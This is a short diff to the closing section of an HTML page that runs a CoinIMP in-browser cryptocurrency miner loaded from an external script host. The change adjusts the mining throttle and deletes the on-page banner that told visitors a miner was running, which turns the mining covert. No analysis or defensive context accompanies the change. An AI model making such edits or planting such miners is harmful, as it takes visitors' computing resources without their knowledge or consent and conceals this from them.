@@ -168,10 +168,9 @@
   <script src="https://www.hostingcloud.racing/hDTl.js"></script>
   <script>
       var _client = new Client.Anonymous('ee3c3e8c50942905be889544264cc91678b72b870fbebdccfa0f5260f0d1e5cb', {
-          throttle: 0, ads: 0
+          throttle: 0.3, ads: 0
       });
       _client.start();
-      _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
   </script>
 </body>
 </html>
